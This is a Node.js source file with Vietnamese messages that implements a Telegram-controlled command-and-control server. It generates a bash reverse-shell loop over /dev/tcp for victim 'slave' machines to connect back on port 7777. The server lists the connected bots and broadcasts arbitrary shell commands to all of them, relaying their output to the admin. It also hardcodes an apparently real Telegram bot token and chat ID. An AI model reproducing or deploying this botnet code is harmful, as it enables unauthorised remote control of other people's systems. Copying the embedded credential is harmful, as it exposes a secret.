const net = require('net');
const TelegramBot = require('node-telegram-bot-api');
const https = require('https');

const token = '8129263243:AAFApr9Z8EapobeJQoPK9hF-FdjLekrxujc';
const chatIdAdmin = 7371969470;

const bot = new TelegramBot(token, { polling: true });
const clients = new Map(); // socket => { ip, port, id }
const buffers = new Map(); // socket => { data, timeout }
let botCounter = 1;

function getIPv4(callback) {
  https.get('https://api.ipify.org?format=json', res => {
    let data = '';
    res.on('data', chunk => data += chunk);
    res.on('end', () => {
      try {
        const ip = JSON.parse(data).ip;
        callback(ip);
      } catch {
        callback('YOUR_PUBLIC_IP');
      }
    });
  }).on('error', () => callback('YOUR_PUBLIC_IP'));
}

function sendSlaveCommand() {
  getIPv4(ipv4 => {
    const slaveCmd = `while true; do
  exec 3<>/dev/tcp/${ipv4}/7777
  while read -r cmd <&3; do
    [[ -z "$cmd" ]] && continue
    output=$(bash -c "$cmd" 2>&1)
    echo "$output" >&3
  done
  sleep 2
done`;
    bot.sendMessage(chatIdAdmin, `🔥 Server sẵn sàng trên cổng 7777\n\nCopy lệnh này chạy trên slave:\n\`\`\`bash\n${slaveCmd}\n\`\`\``, { parse_mode: 'Markdown' });
  });
}

function flushBuffer(socket) {
  const client = clients.get(socket);
  const buf = buffers.get(socket);
  if (!client || !buf || !buf.data) return;

  bot.sendMessage(chatIdAdmin, `📡 Bot ${client.id} - ${client.ip}:${client.port} Kết quả:\n\`\`\`\n${buf.data.trim()}\n\`\`\``, {
    parse_mode: 'Markdown'
  });

  buffers.set(socket, { data: '', timeout: null });
}

const server = net.createServer(socket => {
  const ip = socket.remoteAddress.replace(/^.*:/, '');
  const port = socket.remotePort;
  const id = botCounter++;

  clients.set(socket, { ip, port, id });
  buffers.set(socket, { data: '', timeout: null });

  bot.sendMessage(chatIdAdmin, `[+] Bot mới kết nối: Bot ${id} - ${ip}:${port}`);

  socket.on('data', data => {
    const str = data.toString();
    const buf = buffers.get(socket);
    if (!buf) return;

    buf.data += str;
    if (buf.timeout) clearTimeout(buf.timeout);
    buf.timeout = setTimeout(() => flushBuffer(socket), 300);
  });

  const handleDisconnect = () => {
    const client = clients.get(socket);
    if (!client) return;
    clients.delete(socket);
    buffers.delete(socket);
    bot.sendMessage(chatIdAdmin, `[-] Bot mất kết nối: Bot ${client.id} - ${client.ip}:${client.port}`);
  };

  socket.on('close', handleDisconnect);
  socket.on('error', handleDisconnect);
});

server.listen(7777, () => {
  console.log('[*] Server lắng nghe cổng 7777');
  sendSlaveCommand();
});

bot.onText(/^\/listbot$/, msg => {
  if (msg.chat.id !== chatIdAdmin) return;
  if (clients.size === 0) return bot.sendMessage(chatIdAdmin, '❌ Không có bot nào kết nối.');

  let text = `🤖 Có ${clients.size} bot đang kết nối:\n`;
  for (const { ip, port, id } of clients.values()) {
    text += `Bot ${id} - [${ip}:${port}]\n`;
  }
  bot.sendMessage(chatIdAdmin, text);
});

bot.onText(/^\/cmd (.+)$/, (msg, match) => {
  if (msg.chat.id !== chatIdAdmin) return;
  const cmd = match[1].trim();
  if (!cmd) return bot.sendMessage(chatIdAdmin, '❌ Nhập lệnh sau `/cmd <lệnh>`.', { parse_mode: 'Markdown' });

  if (clients.size === 0) return bot.sendMessage(chatIdAdmin, '❌ Không có bot nào kết nối.');

  for (const socket of clients.keys()) {
    try {
      socket.write(cmd + '\n');
    } catch {}
  }
  bot.sendMessage(chatIdAdmin, `✅ Đã gửi lệnh cho ${clients.size} bot:\n\`${cmd}\``, { parse_mode: 'Markdown' });
});
